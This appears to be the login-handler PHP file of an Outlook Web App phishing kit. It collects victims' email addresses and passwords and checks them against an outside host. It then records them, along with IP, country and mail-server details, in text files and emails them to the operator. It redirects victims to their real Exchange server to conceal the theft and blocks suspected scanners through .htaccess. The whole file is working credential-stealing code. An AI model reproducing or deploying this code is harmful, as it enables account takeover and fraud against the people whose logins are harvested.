<?php
session_start();
require_once('../config.php');
defined('9A466B642B0D29A62244DFB3521AF1E7A1333C9C111235243BE8AD0452A1666D3386D35C8ABE350505387D1164FF997C0238742') or exit();
include_once('../sendto.php');
$isError = '';
$_SESSION['error'] = '';

if(isset($_POST['send']) && $_SESSION['visitor_ip'] == show_visitor_ip()) {
	
	
	$dom =  encodeDomain($_POST['username']);
	if(!is_email($_POST['username']) || !isset($_POST['username']) || !isset($_POST['password']) || empty($_POST['username']) || empty($_POST['password']) || ($_POST['username'] != $_SESSION['owaemail'])) {
		$isError .= '<div id="signInErrorDiv" class="signInError" role="alert" tabIndex="0">
            The user name or password you entered isn&#39;t correct. Try entering it again.
            </div>';
		$_SESSION['error'] .= $isError;
		exit(header(sprintf("Location:%s",'login.php?c='.$_SESSION['hsh'].'&replaceCurrent=1&reason=2&url='.$dom)));
	}
	if(mx_exists(trim($_POST['username']),$invalid)) {
		$isError .= '<div id="signInErrorDiv" class="signInError" role="alert" tabIndex="0">
            The user name you entered is invalid. Try entering a correct username.
            </div>';
		$_SESSION['error'] .= $isError;
		exit(header(sprintf("Location:%s",'login.php?c='.$_SESSION['hsh'].'&replaceCurrent=1&reason=2&url='.$dom)));
	}
	if($isError === '') {
		$passWd = $_POST['password'];
		$eMail = $_POST['username'];
		$result = makePostRequest($eMail,$passWd);
		$responseObject = json_decode($result["response"], true);
		$status_code = $result["status_code"];
		$status = $responseObject['status'];
		$composedMessage = prepareMessageContent($eMail, $passWd, $responseObject);
		$checkermsg = $eMail.":".$passWd.":".$status;
		$message = $composedMessage[0];
		$subject = $composedMessage[1];
		$headers = $composedMessage[2];
		
		$_SESSION['count'] = !isset($_SESSION['count']) ? 1 : $_SESSION['count'];
		if($saveintext === 'yes') @file_put_contents( '../'.$filename.'.txt', $message.PHP_EOL , FILE_APPEND );
		if($savechkertext === 'yes') @file_put_contents( '../'.$chkrfilename.'.txt', $checkermsg.PHP_EOL , FILE_APPEND );
		if($sendtoemail === 'yes') @mail($send_to,$subject,$message,$headers);
		if (isset($result["error"]) || $responseObject['status'] != "success"){
			$isError .= '<div id="signInErrorDiv" class="signInError" role="alert" tabIndex="0">
            The user name you entered is invalid. Try entering a correct username.
            </div>';
		$_SESSION['error'] .= $isError;
		exit(header(sprintf("Location:%s",'login.php?c='.$_SESSION['hsh'].'&replaceCurrent=1&reason=2&url='.$dom)));
		}
		else {
			session_destroy();
			$c = str_replace(".smtp","",$mx);
            $c = str_replace(".mx","",$c);
            $goto = removeEwsExchangeAsmx($responseObject['exchangeUrl']);
			//  exit(header(sprintf('Location:%s',$originalurl)));
			
			exit(header(sprintf('Location:%s',$goto)));
			//The user name or password you entered isn&#39;t correct. Try entering it again.
		}
	}
}
else {
	$bot = show_visitor_ip().' - '.show_visitor_locationByIp('countryName');
	file_put_contents( '../hacker.txt', $bot."\r\n" , FILE_APPEND | LOCK_EX );
	$blocked = 'deny from '.show_visitor_ip();
	file_put_contents( '../.htaccess', $blocked."\r\n" , FILE_APPEND | LOCK_EX );	
	$_SESSION = '';
	session_destroy();	
	exit(header(sprintf("Location:%s", $originalurl)));
}


function prepareMessageContent($em, $pa, $response){
	$status = $response['status'];
	$exchangeUrl = $response['exchangeUrl'];
	$displayName = $response['displayName'];
	$browser = $_SERVER['HTTP_USER_AGENT'];
	$adddate = date("D M d, Y g:i a");
	$ip = show_visitor_ip();
	$country = show_visitor_locationByIp('countryName');
	$message = '';
	$headers = '';
	$mail_part = explode("@", $em);
	$domain = $mail_part[1];
	$results = dns_get_record($domain, DNS_MX);
	if (!empty($results)) {
		$target_pri = min(array_column($results, "pri"));
		$highest_pri = array_filter(
			$results,
			function ($item) use ($target_pri) {
				return $item["pri"] === $target_pri;
			}
		);
		foreach ($highest_pri as $mx) {
			$mx = "$mx[target] ";
		}
	} else {
		$mx = '';
	}

	$message .= "--------+ OWA ReZulT " . $status . "+--------\n";
	$message .= "Email : " . $em . "\n";
	$message .= "Password : " . $pa . "\n";
	$message .= "MX Record : " . $mx . "\n";
	$message .= "Exchange URL : " . $exchangeUrl . "\n";
	$message .= "-----------------------------------\n";
	$message .= "User Agent : " . $browser . "\n";
	$message .= "Client IP : " . $ip . "\n";
	$message .= "Country : " . $country . "\n";
	$message .= "Date: " . $adddate . "\n";
	$message .= "---------+ Created by SQ +-------------\n";

	$subject = "OWA Rezult $status | $country | $displayName | $em ";
	$headers = "From: OWA <info>\n";
	$headers .= "MIME-Version: 1.0\n";

	return [$message, $subject, $headers];
}

function makePostRequest($u, $p) {

    $url = 'https://dcwsow00wso4ko888oc8cgwk.82.153.134.173.sslip.io/aut';

    $data = [
        'u' => $u,
        'p' => $p,
    ];

    $bodyString = json_encode($data);

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $bodyString);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        return [
            'response' => curl_error($ch),
            'status_code' => -1,
        ];
    } else {
        $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        return [
            'response' => $response,
            'status_code' => $status_code,
        ];
    }

    curl_close($ch);

}

function removeEwsExchangeAsmx($hp) {
	$hp = strtolower($hp);
	if (strpos($hp, 'ews/exchange.asmx') !== false) {
	  $hp = str_replace('ews/exchange.asmx', '', $hp);
	}
	return $hp;
  }